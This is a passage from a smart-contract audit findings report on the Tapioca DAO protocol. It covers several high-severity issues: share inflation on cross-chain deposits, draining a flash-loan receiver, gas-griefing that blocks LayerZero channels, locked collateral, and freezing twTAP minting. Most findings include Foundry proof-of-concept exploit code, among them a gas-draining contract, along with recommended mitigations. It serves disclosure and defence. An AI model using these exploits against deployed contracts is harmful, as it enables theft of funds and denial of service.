        uint256 share_ = 2e18; // steal all available funds in (m)Tapioca (only 1 user with 2e18)
        uint256 assetId_ = 1;
        uint16 lzDstChainId_ = 102;
        address zroPaymentAddress_ = address(0);
        ICommonData.ISendOptions memory options_ = ICommonData.ISendOptions(200_000, zroPaymentAddress_);

        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));

        // attacker is only debited 1 amount, but specifies 2e18 shares, a possibly much bigger corresponding amount
        deal(mockERC20_, attacker_, 1);
        vm.startPrank(attacker_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 1);
        tapiocaOft_.wrap(attacker_, attacker_, 1);
        tapiocaOft_.sendToStrategy{value: 1 ether}(from_, to_, amount_, share_, assetId_, lzDstChainId_, options_);
        vm.stopPrank();

        bytes memory lzPayload_ = abi.encode(
            PT_YB_SEND_STRAT,
            bytes32(uint256(uint160(from_))),
            attacker_,
            amount_,
            share_,
            assetId_,
            zroPaymentAddress_
        );
        
        // attacker was debited from 1 amount, but deposit sends an amount of 2e18
        vm.expectCall(address(mockYieldBox_), 0, abi.encodeCall(MockYieldBox.depositAsset, (assetId_, address(tapiocaOft_), attacker_, 2e18, 2e18)));
        
        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
    }
}
```

</details>

### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

Given that it's impossible to fetch the `YieldBox` ratio in the source chain, it's best to stick with the amount only and remove the `share` argument in the cross chain `sendToStrategy()` function call.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281#issuecomment-1702991316)**

***

## [[H-15] Attacker can specify any `receiver` in `USD0.flashLoan()` to drain `receiver` balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223)
*Submitted by [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223), also found by [n1punp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/308)*

The flash loan feature in USD0's `flashLoan()` function allows the caller to specify the `receiver` address. USD0 is then minted to this address and burnt from this address plus a fee after the callback. Since there is a fee in each flash loan, an attacker can abuse this to drain the balance of the `receiver` because the `receiver` can be specified by the caller without validation.

### Proof of Concept

The allowance checked that `receiver` approved to `address(this)` but not check if `receiver` approved to `msg.sender`

```solidity
uint256 _allowance = allowance(address(receiver), address(this));
require(_allowance >= (amount + fee), "USDO: repay not approved");
// @audit can specify receiver, drain receiver's balance
_approve(address(receiver), address(this), _allowance - (amount + fee));
_burn(address(receiver), amount + fee);
return true;
```

### Recommended Mitigation Steps

Consider changing the "allowance check" to be the allowance that the receiver gave to the caller instead of `address(this)`.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1223#issuecomment-1702986076)**

***

## [[H-16] Attacker can block LayerZero channel due to variable gas cost of saving payload](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/BaseUSDO.sol#L399> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L442> 

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L52>

This is an issue that affects `BaseUSDO`, `BaseTOFT`, and `BaseTapOFT` or all the contracts which are sending and receiving LayerZero messages.
The consequence of this is that anyone can with low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

### Proof of Concept

I will illustrate the concept of blocking the pathway on the example of sending a message through `BaseTOFT’s` [`sendToYAndBorrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L290).
This function allows the user to mint/borrow `USDO` with some collateral that is wrapped in a `TOFT` and gives the option of transferring minted `USDO` to another chain.

The attack starts by invoking [`sendToYBAndBorrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L290) which delegate calls into [`BaseTOFTMarketModule`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L87).
If we look at the implementation inside the `BaseTOFTMarketModule` nothing is validated there except for the `lzPayload` which has the packetType of `PT_YB_SEND_SGL_BORROW`.

The only validation of the message happens inside the [`LzApp`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L49) with the configuration which was set.
What is restrained within this configuration is the [`payload size`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L52), which if not configured defaults to [10k bytes](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L18).

The application architecture was set up in a way that all the messages regardless of their packetType go through the same `_lzSend` implementation.
I’m mentioning that because it means that if the project decides to change the default payload size to something smaller(or bigger) it will be dictated by the message with the biggest possible payload size.

I’ve mentioned the [minimum gas enforcement in my other issue](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207) but even if that is fixed and a high min gas is enforced this is another type of issue.

To execute the attack we need to pass the following parameters to the function mentioned above:

```solidity
    function executeAttack() public {
        address tapiocaOFT = makeAddr("TapiocaOFT-AVAX");
        tapiocaOFT.sendToYBAndBorrow{value: enough_gas_to_go_through}(
            address from => // malicious user address
            address to => // malicious user address
            lzDstChainId => // any chain lzChainId
            bytes calldata airdropAdapterParams => // encode in a way to send to remote with minimum gas enforced by the layer zero configuration
            ITapiocaOFT.IBorrowParams calldata borrowParams, // can be anything
            ICommonData.IWithdrawParams calldata withdrawParams, // can be anything
            ICommonData.ISendOptions calldata options, // can be anything
            ICommonData.IApproval[] calldata approvals // Elaborating on this below
        )
    }
```

`ICommonData.IApproval[] calldata approvals` are going to be fake data so [max payload size limit is reached(10k)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L105-L112). The `target` of the 1st approval in the array will be the `GasDrainingContract` deployed on the receiving chain and the `permitBorrow = true`.

```solidity
    contract GasDrainingContract {
        mapping(uint256 => uint256) public storageVariables;
    
        function permitBorrow(
            address owner,
            address spender,
            uint256 value,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external {
            for (uint256 i = 0; i < 100000; i++) {
                storageVariables[i] = i;
            }
        }
    }
```

Let’s take an example of an attacker sending a transaction on the home chain which specifies a 1 million gasLimit for the destination transaction.

1.  Transaction is successfully received inside the [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L35) after which it reaches [\_blockingLzReceive](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L25).

2.  This is the first external call and according to [`EIP-150`](https://eips.ethereum.org/EIPS/eip-150) out of 1 million gas:

    *   63/64 or \~985k would be forwarded to the external call.
    *   1/64 or \~15k will be left for the rest of the execution.

3.  The cost of saving a big payload into the [`failedMessages`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L27-L29) and emitting events is higher than 15k.

When it comes to 10k bytes it is around 130k gas but even with smaller payloads, it is still significant. It can be tested with the following code:

<details>

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract FailedMessagesTest is Test {

    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

    event MessageFailed(uint16 _srcChainId, bytes _srcAddress, uint64 _nonce, bytes _payload, bytes _reason);

    function setUp() public {}

    function testFMessagesGas() public {
        uint16 srcChainid = 1;
        bytes memory srcAddress = abi.encode(makeAddr("Alice"));
        uint64 nonce = 10;
        bytes memory payload = getDummyPayload(9999); // max payload size someone can send is 9999 bytes
        bytes memory reason = getDummyPayload(2);

        uint256 gasLeft = gasleft();
        _storeFailedMessage(srcChainid, srcAddress, nonce, payload, reason);
        emit log_named_uint("gas used", gasLeft - gasleft());
    }


    function _storeFailedMessage(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload,
        bytes memory _reason
    ) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
    }

    function getDummyPayload(uint256 payloadSize) internal pure returns (bytes memory) {
        bytes memory payload = new bytes(payloadSize);
        for (uint256 i = 0; i < payloadSize; i++) {
            payload[i] = bytes1(uint8(65 + i));
        }
        return payload;
    }
}
```

</details>

*   If the payload is 9999 bytes the cost of saving it and emitting the event is 131k gas.
*   Even with a smaller payload of 500 bytes the cost is 32k gas.

4.  If we can drain the 985k gas in the rest of the execution since storing `failedMessages` would fail the pathway would be blocked because this will fail at the level of LayerZero and result in [`StoredPayload`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L122-L123).

5.  Let’s continue the execution flow just to illustrate how this would occur, inside the implementation for [`_nonblockingLzReceive`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L442) the `_executeOnDestination` is invoked for the right packet type and there we have another [external call](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L403) which delegatecalls into the right module.

Since it is also an external call only 63/64 gas is forwarded which is roughly:

*   970k would be forwarded to the module
*   15k reserved for the rest of the function

6.  This 970k gas is used for [`borrow`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L126), and it would be totally drained inside our [malicious GasDraining contract from above](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L187), and then the execution would continue inside the [`executeOnDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L430) which also fails due to 15k gas not being enough, and finally, it fails inside the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L27) due to out of gas, resulting in blocked pathway.

### Tools Used

Foundry

### Recommended Mitigation Steps

[`_executeOnDestination` storing logic](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L430) is just code duplication and serves no purpose.
Instead of that you should override the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L24).

Create a new storage variable called `gasAllocation` which can be set only by the owner and change the implementation to:

```solidity
(bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft() - gasAllocation, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
```

While ensuring that `gasleft() > gasAllocation` in each and every case. This should be enforced on the sending side.

Now this is tricky because as I have shown the gas cost of storing payload varies with payload size meaning the `gasAllocation` needs to be big enough to cover storing max payload size.

### Other occurrences

This exploit is possible with all the packet types which allow arbitrary execution of some code on the receiving side with something like I showed with the `GasDrainingContract`. Since almost all packets allow this it is a common issue throughout the codebase, but anyway listing below where it can occur in various places:

<details>

### BaseTOFT

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L205>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L204>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L111>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L221>

*   <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L118>

### BaseUSDO

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L191>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L190>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L104>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L93>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L206>

*   <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L103>

### BaseTapOFT

*   <https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L225> Here we would need to pass `IERC20[] memory rewardTokens` as an array of one award token which is our malicious token which implements the `ERC20` and `ISendFrom` interfaces.

</details>

Since inside the `twTap.claimAndSendRewards(tokenID, rewardTokens)` there are no reverts in case the `rewardToken` is
invalid we can execute the gas draining attack inside the [`sendFrom`](https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229)
whereby `rewardTokens[i]` is our malicious contract.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1220#issuecomment-1702980386)**

***

## [[H-17] Attacker can block LayerZero channel due to missing check of minimum gas passed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207), also found by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/841)*

This is an issue that affects all the contracts that inherit from `NonBlockingLzApp` due to incorrect overriding of the `lzSend` function and lack of input validation and the ability to specify whatever [`adapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L101) you want.
The consequence of this is that anyone can with a low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

### Proof of Concept

**Layer Zero minimum gas showcase**

While sending messages through LayerZero, the sender can specify how much gas he is willing to give to the Relayer to deliver the payload to the destination chain. This configuration is specified in [relayer adapter params](https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters).
All the invocations of `lzSend` inside the TapiocaDao contracts naively assume that it is not possible to specify less than 200k gas on the destination, but in reality, you can pass whatever you want.
As a showcase, I have set up a simple contract that implements the `NonBlockingLzApp` and sends only 30k gas which reverts on the destination chain resulting in `StoredPayload` and blocking of the message pathway between the two lzApps.
The transaction below proves that if no minimum gas is enforced, an application that has the intention of using the `NonBlockingApp` can end up in a situation where there is a `StoredPayload` and the pathway is blocked.

Transaction Hashes for the example mentioned above:

*   LayerZero Scan: <https://layerzeroscan.com/106/address/0xe6772d0b85756d1af98ddfc61c5339e10d1b6eff/message/109/address/0x5285413ea82ac98a220dd65405c91d735f4133d8/nonce/1>
*   Tenderly stack trace of the sending transaction hash: <https://dashboard.tenderly.co/tx/avalanche-mainnet/0xe54894bd4d19c6b12f30280082fc5eb693d445bed15bb7ae84dfaa049ab5374d/debugger?trace=0.0.1>
*   Tenderly stack trace of the receiving transaction hash: <https://dashboard.tenderly.co/tx/polygon/0x87573c24725c938c776c98d4c12eb15f6bacc2f9818e17063f1bfb25a00ecd0c/debugger?trace=0.2.1.3.0.0.0.0>

**Attack scenario**

The attacker calls [`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L99) and specifies a small amount of gas in the [airdropAdapterParams(\~50k gas)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41).
The Relayer delivers the transaction with the specified gas at the destination.

The transaction is first validated through the LayerZero contracts before it reaches the `lzReceive` function. The Relayer will give exactly the gas which was specified through the `airdropAdapterParams`.
The line where it happens inside the LayerZero contract is [here](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L118), and `{gas: _gasLimit}` is the gas the sender has paid for.
The objective is that due to this small gas passed the transaction reverts somewhere inside the [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L36-L41) function and the message pathway is blocked, resulting in [`StoredPayload`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L122).

The objective of the attack is that the execution doesn't reach the [`NonblockingLzApp`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25) since then the behavior of the `NonBlockingLzApp` would be as expected and the pathway wouldn't be blocked,
but rather the message would be stored inside the [`failedMessages`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L18)

### Tools Used

Foundry, Tenderly, LayerZeroScan

### Recommended Mitigation Steps

The minimum gas enforced to send for each and every `_lzSend` in the app should be enough to cover the worst-case scenario for the transaction to reach the
first try/catch which is [here](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25).

I would advise the team to do extensive testing so this min gas is enforced.

Immediate fixes:

1.  This is most easily fixed by overriding the [`_lzSend`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L49) and extracting the gas passed from adapterParams with [`_getGasLimit`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L63) and validating that it is above some minimum threshold.

2.  Another option is specifying the minimum gas for each and every packetType and enforcing it as such.

I would default to the first option because the issue is twofold since there is the minimum gas that is common for all the packets, but there is also the minimum gas per packet since each packet has a different payload size and data structure, and it is being differently decoded and handled.

Note: This also applies to the transaction which when received on the destination chain is supposed to send another message, this callback message should also be validated.

When it comes to the default implementations inside the [`OFTCoreV2`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L10) there are two packet types [`PT_SEND`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L94)
and [`PT_SEND_AND_CALL`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L119) and there is the available configuration of `useCustomAdapterParams` which can enforce the minimum gas passed. This should all be configured properly.

### Other occurrences

There are many occurrences of this issue in the TapiocaDao contracts, but applying option 1 I mentioned in the mitigation steps should solve the issue for all of them:

<details>

**TapiocaOFT**

`lzSend`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L101> - lzData.extraGas This naming is misleading it is not extraGas it is the gas that is used by the Relayer.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L68>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L99>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L66>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L114>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L70>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L111>

`sendFrom`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142> - This is executed as a part of lzReceive but is a message inside a message. It is also subject to the attack above, although it goes through the `PT_SEND` so adequate config should solve the issue.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L241>

### BaseUSDO

`lzSend`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L41>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L86>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L51>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L82>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L48>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L87>

`sendFrom`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L127>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L226>

### BaseTapOFT

`lzSend`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L108>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L181>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L274>

`sendFrom`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L312>

### MagnetarV2

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/MagnetarV2.sol#L268>

### MagnetarMarketModule

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/modules/MagnetarMarketModule.sol#L725>

</details>

**[0xRektora (Tapioca) confirmed via duplicate issue 841](https://github.com/code-423n4/2023-07-tapioca-findings/issues/841)**

***

## [[H-18] `multiHopSellCollateral()` will fail due to call on an invalid market address causing bridged collateral to be locked up](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1202)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1202)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/Singularity.sol#L409-L427> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLeverage.sol#L81> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L79-L108> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L227>

`multiHopSellCollateral()` allows users to leverage down by selling the `TOFT` collateral on another chain and then send it to host chain (Arbitrum) for repayment of USDO loan.

However, it will fail as it tries to obtain the `repayableAmount` on the destination chain by calling `IMagnetar.getBorrowPartForAmount()` on a non-existing market. That is because Singularity/BigBang markets are only deployed on the host chain.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L205-L227>

```Solidity
    function leverageDownInternal(
        uint256 amount,
        IUSDOBase.ILeverageSwapData memory swapData,
        IUSDOBase.ILeverageExternalContractsData memory externalData,
        IUSDOBase.ILeverageLZData memory lzData,
        address leverageFor
    ) public payable {
        _unwrap(address(this), amount);

        //swap to USDO
        IERC20(erc20).approve(externalData.swapper, amount);
        ISwapper.SwapData memory _swapperData = ISwapper(externalData.swapper)
            .buildSwapData(erc20, swapData.tokenOut, amount, 0, false, false);
        (uint256 amountOut, ) = ISwapper(externalData.swapper).swap(
            _swapperData,
            swapData.amountOutMin,
            address(this),
            swapData.data
        );

        //@audit this call will fail as there is no market in destination chain
        //repay
        uint256 repayableAmount = IMagnetar(externalData.magnetar)
            .getBorrowPartForAmount(externalData.srcMarket, amountOut);
```

### Impact

The issue will prevent users from using `multiHopSellCollateral()` to leverage down.

Furthermore the failure of the cross-chain transaction will cause the bridged collateral to be locked in the TOFT contract on a non-host chain as the refund mechanism will also revert and `retryMessage()` will continue to fail as this is a permanent error.

### Proof of Concept

Consider the following scenario where a user leverage down by selling the collateral on Ethereum (a non-host chain).

1.  User first triggers `Singularity.multiHopSellCollateral()` on host chain Arbitrum.
2.  That will call `SGLLeverage.multiHopSellCollateral()`, which will conduct a cross chain message via `ITapiocaOFT(address(collateral)).sendForLeverage()` to bridge over and sell the collateral on Ethereum mainnet.
3.  The collateral TOFT contract on Ethereum mainnet will receive the bridged collateral and cross-chain message via `_nonBlockingLzReceive()` and then `BaseTOFTLeverageModule.leverageDown()`.
4.  The execution continues with `BaseTOFTLeverageModule.leverageDownInternal()`, but it will revert as it attempt to call `getBorrowPartForAmount()` for a non-existing market in Ethereum.
5.  The bridgex collateral will be locked in the TOFT contract on Ethereum mainnet as the refund mechanism will also revert and `retryMessage()` will continue to fail as this is a permanent error.

### Recommended Mitigation Steps

Obtain the repayable amount on the Arbitrum (host chain) where the BigBang/Singularity markets are deployed.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1202#issuecomment-1702967048)**

***

## [[H-19] `twTAP.participate()` can be permanently frozen due to lack of access control on host-chain-only operations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1170)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1170)*

`twTAP` is a omnichain NFT (ONFT721) that will be deployed on all supported chains.

However, there are no access control for operations meant for execution on the host chain only, such as `participate()`, which mints `twTAP`.

The implication of not restricting `participate()` to host chain is that an attacker can lock `TAP` and participate on other chain to mint `twTAP` with a tokenId that does not exist on the host chain yet. The attacker can then send that `twTAP` to the host chain using the inherited `sendFrom()`, to permanently freeze the `twTAP` contract as `participate()` will fail when attempting to mint an existing `tokenId`.

It is important to restrict minting to the host chain so that `mintedTWTap` (which keeps track of last minted tokenId) is only incremented at one chain, to prevent duplicate tokenId. That is because the `twTAP` contracts on each chain have their own `mintedTWTap` variable and there is no mechanism to sync them.

### Detailed Explanation

In `TwTAP`, there are no modifiers or checks to ensure `participte()` can only be called on the host chain. So we can use it to mint a `twTAP` on a non-host chain. <br><https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L252-L256>

```Solidity
    function participate(
        address _participant,
        uint256 _amount,
        uint256 _duration
    ) external returns (uint256 tokenId) {
        require(_duration >= EPOCH_DURATION, "twTAP: Lock not a week");
```

The `tokenId` to be minted is determined by `mintedTWTap`, which is not synchronized across the chains.

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L309-L310>

```Solidity
    function participate(
        ...
        //@audit tokenId to mint is obtained from `mintedTWTap`
        tokenId = ++mintedTWTap;
        _safeMint(_participant, tokenId);
```

Suppose on host chain, the last minted `tokenId` is `N`. From a non-host chain, we can use `sendFrom()` to send over a `twTAP` with `tokenId` `N+1` and mint a new `twTAP` with the same `tokenId` (see `_creditTo()` below). This will not increment `mintedTWTap` on the host chain, causing a de-sync.

```Solidity
<br>https://github.com/LayerZero-Labs/solidity-examples/blob/main/contracts/token/onft/ONFT721.sol#L24

    function _creditTo(uint16, address _toAddress, uint _tokenId) internal virtual override {
        require(!_exists(_tokenId) || (_exists(_tokenId) && ERC721.ownerOf(_tokenId) == address(this)));
        if (!_exists(_tokenId)) {
            //@audit transfering token N+1 will mint it as it doesnt exists. this will not increment mintedTwTap
            _safeMint(_toAddress, _tokenId);
        } else {
            _transfer(address(this), _toAddress, _tokenId);
        }
    }
```

On the host chain, `participate()` will always revert when it tries to mint the next `twTAP` with `tokenId` `N+1`, as it now exists on the host chain due to `sendFrom()`.

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L309-L310>

```Solidity
    function participate(
        ...
        tokenId = ++mintedTWTap;
        //@audit this will always revert when tokenId already exists
        _safeMint(_participant, tokenId);
```

### Impact

An attacker will be able to permanent freeze the `twTAP.participate()`. This will prevent `TAP` holders from participating in the governance and from claiming rewards, causing loss of rewards to users.

### Proof of Concept

Consider the following scenario,

1.  Suppose we start with `twTAP.mintedTwTap == 0` on all the chains, so next tokenId will be `1`.
2.  Attacker `participate()` with 1 TAP and mint`  twTAP ` on a non-host chain with `tokenId` `1`.
3.  Attacker sends the minted `twTAP` across to host chain using `twTAP.sendFrom()` to permanently freeze the `twTAP` contract.
